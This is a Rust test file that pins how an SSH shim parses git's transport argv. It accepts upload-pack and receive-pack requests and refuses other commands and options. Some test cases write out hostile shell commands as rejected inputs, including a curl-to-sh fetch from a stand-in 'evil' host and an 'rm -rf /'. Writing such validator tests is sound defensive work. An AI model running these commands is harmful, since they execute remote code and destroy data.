//! Acceptance: git's SSH argv contract.
//!
//! PRD: docs/ft/daemon/remote-git-repo.md § Client — git's SSH argv contract (AC1–AC4).
//!
//! Git runs its transport command as `<ssh-command> [options] <host> <command>`, where `<command>`
//! is one shell-quoted string. These tests pin what this binary resolves from that argv, and —
//! just as importantly — what it refuses before opening any connection.

use pretty_assertions::assert_eq;
use rstest::rstest;
use tddy_remote_git_repo::ssh_argv::{parse_ssh_invocation, ArgvError, GitVerb};

/// The argv git appends after the `GIT_SSH_COMMAND` string.
fn git_invocation(host: &str, command: &str) -> Vec<String> {
    vec![host.to_string(), command.to_string()]
}

/// An argv where git passed SSH options ahead of the host — what `GIT_SSH_VARIANT=ssh` produces.
fn git_invocation_with_options(options: &[&str], host: &str, command: &str) -> Vec<String> {
    let mut argv: Vec<String> = options.iter().map(|o| o.to_string()).collect();
    argv.push(host.to_string());
    argv.push(command.to_string());
    argv
}

fn parsed(argv: &[String]) -> tddy_remote_git_repo::GitRequest {
    parse_ssh_invocation(argv).expect("invocation must parse")
}

fn rejected(argv: &[String]) -> ArgvError {
    parse_ssh_invocation(argv).expect_err("invocation must be refused")
}

#[test]
fn resolves_the_daemon_instance_the_verb_and_the_project_from_a_clone_invocation() {
    // Given git asks a daemon to serve a clone of the project "my-app"
    let argv = git_invocation("udoo-1780828020298", "git-upload-pack 'my-app'");

    // When
    let request = parsed(&argv);

    // Then
    assert_eq!(request.daemon_instance_id, "udoo-1780828020298");
    assert_eq!(request.verb, GitVerb::UploadPack);
    assert_eq!(request.project_ref, "my-app");
}

#[test]
fn resolves_a_push_invocation_to_the_receive_pack_verb() {
    // Given git pushes to the same project
    let argv = git_invocation("udoo-1780828020298", "git-receive-pack 'my-app'");

    // When
    let request = parsed(&argv);

    // Then
    assert_eq!(request.verb, GitVerb::ReceivePack);
    assert_eq!(request.project_ref, "my-app");
}

#[rstest]
#[case::hyphenated_upload("git-upload-pack 'my-app'", GitVerb::UploadPack)]
#[case::spaced_upload("git upload-pack 'my-app'", GitVerb::UploadPack)]
#[case::hyphenated_receive("git-receive-pack 'my-app'", GitVerb::ReceivePack)]
#[case::spaced_receive("git receive-pack 'my-app'", GitVerb::ReceivePack)]
fn accepts_both_spellings_git_uses_for_each_pack_verb(
    #[case] command: &str,
    #[case] expected: GitVerb,
) {
    // Given a command in one of the two spellings git emits
    let argv = git_invocation("udoo-1", command);

    // When
    let request = parsed(&argv);

    // Then
    assert_eq!(request.verb, expected);
}

#[test]
fn dequotes_a_project_name_containing_a_space_and_an_apostrophe() {
    // Given git's sq_quote of `it's my app` — a closing quote, an escaped apostrophe, a reopen
    let argv = git_invocation("udoo-1", r#"git-upload-pack 'it'\''s my app'"#);

    // When
    let request = parsed(&argv);

    // Then
    assert_eq!(request.project_ref, "it's my app");
}

#[test]
fn strips_a_leading_slash_so_a_rooted_remote_names_the_same_project() {
    // Given the scp-style remotes `udoo-1:my-app` and `udoo-1:/my-app`
    let bare = git_invocation("udoo-1", "git-upload-pack 'my-app'");
    let rooted = git_invocation("udoo-1", "git-upload-pack '/my-app'");

    // When
    let from_bare = parsed(&bare);
    let from_rooted = parsed(&rooted);

    // Then both name the same project
    assert_eq!(from_rooted.project_ref, "my-app");
    assert_eq!(from_rooted.project_ref, from_bare.project_ref);
}

#[test]
fn ignores_a_user_prefix_on_the_host_so_a_habitual_git_at_remote_works() {
    // Given a remote written `git@udoo-1780828020298:my-app`
    let argv = git_invocation("git@udoo-1780828020298", "git-upload-pack 'my-app'");

    // When
    let request = parsed(&argv);

    // Then the user part is discarded — the host is the daemon instance id
    assert_eq!(request.daemon_instance_id, "udoo-1780828020298");
}

#[rstest]
#[case::shell("sh -c 'curl http://evil/ | sh'")]
#[case::arbitrary_binary("/bin/bash")]
#[case::git_but_not_a_pack_verb("git log")]
#[case::lookalike("git-upload-pack-evil 'my-app'")]
#[case::archive("git-upload-archive 'my-app'")]
fn refuses_a_command_that_is_not_a_git_pack_verb(#[case] command: &str) {
    // Given git — or something pretending to be git — asks for a command outside the whitelist
    let argv = git_invocation("udoo-1", command);

    // When
    let error = rejected(&argv);

    // Then it is refused by name, with no connection attempted
    assert_eq!(error, ArgvError::UnsupportedCommand(command.to_string()));
}

#[test]
fn exits_with_gits_bad_request_code_when_the_command_is_not_a_pack_verb() {
    // Given a rejected command
    let error = rejected(&git_invocation("udoo-1", "/bin/bash"));

    // When / Then 128 is "fatal, bad request" — not 255, which means the transport failed
    assert_eq!(error.exit_code(), 128);
}

#[test]
fn names_the_rejected_command_in_the_message_so_the_refusal_is_diagnosable() {
    // Given a rejected command
    let error = rejected(&git_invocation("udoo-1", "sh -c 'rm -rf /'"));

    // When
    let message = error.to_string();

    // Then
    assert!(
        message.contains("sh -c 'rm -rf /'"),
        "message must quote the rejected command, got: {message}"
    );
}

#[test]
fn rejects_a_port_by_name_rather_than_silently_ignoring_where_it_would_connect() {
    // Given a remote URL carrying a port, which makes git pass `-p` ahead of the host
    let argv = git_invocation_with_options(&["-p", "2222"], "udoo-1", "git-upload-pack 'my-app'");

    // When
    let error = rejected(&argv);

    // Then the option is named. A daemon instance id is the whole address, so honouring the
    // request is impossible — and dropping it would connect somewhere the user did not ask for.
    assert_eq!(error, ArgvError::UnsupportedOption("-p".to_string()));
}

#[rstest]
#[case::ipv4_only("-4")]
#[case::ipv6_only("-6")]
#[case::identity_file("-i")]
#[case::login_name("-l")]
#[case::quiet("-q")]
fn rejects_an_unrecognised_ssh_option_rather_than_mistaking_it_for_the_host(#[case] option: &str) {
    // Given git places an option this shim has no analogue for ahead of the host
    let argv = git_invocation_with_options(&[option], "udoo-1", "git-upload-pack 'my-app'");

    // When
    let error = rejected(&argv);

    // Then the option is named. Taking it as the host would shift every argument along, so the
    // refusal would name the daemon as the command and never mention the option at all.
    assert_eq!(error, ArgvError::UnsupportedOption(option.to_string()));
}

#[test]
fn ignores_the_send_env_option_git_uses_to_probe_for_protocol_v2() {
    // Given git's protocol-v2 probe, which the `ssh` variant places ahead of the host
    let argv = git_invocation_with_options(
        &["-o", "SendEnv=GIT_PROTOCOL"],
        "udoo-1",
        "git-upload-pack 'my-app'",
    );

    // When
    let request = parsed(&argv);

    // Then the option is dropped and the invocation still resolves — this is what makes the shim
    // work whichever SSH variant git picked, at the cost of negotiating v0/v1
    assert_eq!(request.daemon_instance_id, "udoo-1");
    assert_eq!(request.project_ref, "my-app");
}

#[test]
fn ignores_further_ssh_settings_it_has_no_analogue_for() {
    // Given several ssh -o settings
    let argv = git_invocation_with_options(
        &[
            "-o",
            "SendEnv=GIT_PROTOCOL",
            "-o",
            "BatchMode=yes",
            "-o",
            "StrictHostKeyChecking=no",
        ],
        "udoo-1",
        "git-receive-pack 'my-app'",
    );

    // When
    let request = parsed(&argv);

    // Then
    assert_eq!(request.verb, GitVerb::ReceivePack);
    assert_eq!(request.project_ref, "my-app");
}

#[test]
fn reports_a_missing_command_when_git_passed_only_a_host() {
    // Given an interactive-shell-shaped invocation — a host and nothing to run
    let argv = vec!["udoo-1".to_string()];

    // When
    let error = rejected(&argv);

    // Then
    assert_eq!(error, ArgvError::MissingCommand);
}

#[test]
fn reports_a_missing_host_when_git_passed_nothing() {
    // Given
    let argv: Vec<String> = Vec::new();

    // When
    let error = rejected(&argv);

    // Then
    assert_eq!(error, ArgvError::MissingHost);
}

#[test]
fn reports_malformed_quoting_rather_than_guessing_at_the_project() {
    // Given a command whose quote is never closed
    let argv = git_invocation("udoo-1", "git-upload-pack 'my-app");

    // When
    let error = rejected(&argv);

    // Then
    assert_eq!(
        error,
        ArgvError::MalformedQuoting("git-upload-pack 'my-app".to_string())
    );
}

#[test]
fn reports_a_pack_verb_that_names_no_repository() {
    // Given a whitelisted verb with no argument
    let argv = git_invocation("udoo-1", "git-upload-pack");

    // When
    let error = rejected(&argv);

    // Then
    assert_eq!(error, ArgvError::MissingProjectRef);
}

#[test]
fn carries_the_hyphenated_verb_name_on_the_wire_whichever_spelling_git_used() {
    // Given the spaced spelling
    let request = parsed(&git_invocation("udoo-1", "git upload-pack 'my-app'"));

    // When
    let wire_name = request.verb.wire_name();

    // Then the daemon always sees one canonical spelling
    assert_eq!(wire_name, "git-upload-pack");
}
